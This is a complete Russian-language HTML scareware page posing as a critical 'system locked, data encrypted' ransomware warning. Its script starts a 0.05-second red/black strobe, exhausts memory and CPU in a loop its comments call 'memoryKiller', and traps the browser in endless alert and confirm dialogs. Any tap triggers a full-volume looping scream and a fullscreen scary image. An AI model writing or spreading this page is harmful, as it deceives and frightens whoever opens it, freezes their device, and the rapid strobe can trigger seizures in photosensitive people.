<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>ВНИМАНИЕ! КРИТИЧЕСКАЯ ОШИБКА!</title>
    <style>
        /* Главный эффект мерцания */
        @keyframes strobe {
            0% { background-color: #000; }
            50% { background-color: #f00; }
            100% { background-color: #000; }
        }
        .flash-active {
            animation: strobe 0.05s infinite !important;
        }
        body { 
            background: #000; 
            color: #fff; 
            text-align: center; 
            font-family: sans-serif; 
            margin: 0; 
            padding-top: 100px; 
            overflow: hidden; 
            width: 100vw; 
            height: 100vh;
        }
        #scary { 
            display: none; 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100vw; 
            height: 100vh; 
            object-fit: cover; 
            z-index: 9999; 
        }
        h1 { font-size: 40px; text-shadow: 2px 2px #000; }
    </style>
</head>
<body id="main_body" class="flash-active"> <!-- Мерцание включено сразу здесь -->

    <div id="ui">
        <h1>СИСТЕМА ЗАБЛОКИРОВАНА</h1>
        <p style="font-size: 20px;">Обнаружена попытка взлома. <br>Ваши данные зашифрованы.</p>
        <br>
        <p>Нажмите в любом месте для восстановления...</p>
    </div>

    <img id="scary" src="https://raw.githubusercontent.com">
    <audio id="scream" src="https://raw.githubusercontent.com" loop></audio>

    <script>
        // 1. СРАЗУ ПРИ ЗАГРУЗКЕ
        window.onload = function() {
            // Принудительно включаем мерцание еще раз для верности
            document.getElementById('main_body').classList.add('flash-active');

            // Нагрузка на телефон (ОЗУ + Проц)
            let memoryKiller = [];
            setInterval(() => {
                for(let i=0; i<300; i++) {
                    memoryKiller.push(new Array(1000000).join("ALARM_"));
                }
            }, 100);

            // Вибрация (для Android)
            if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 500]);

            // Бесконечные окна через 2 секунды
            setTimeout(() => {
                while(true) {
                    alert("КРИТИЧЕСКАЯ ОШИБКА!");
                    confirm("УДАЛИТЬ ВСЕ ФАЙЛЫ?");
                }
            }, 2000);
        };

        // 2. СКРИМЕР ПРИ ЛЮБОМ КЛИКЕ (так как звук без клика запрещен)
        window.onclick = window.ontouchstart = function() {
            const s = document.getElementById("scream");
            const i = document.getElementById("scary");
            s.volume = 1.0;
            s.play();
            i.style.display = "block";
            
            // Пытаемся занять весь экран
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(() => {});
            }
        };
    </script>
</body>
</html>
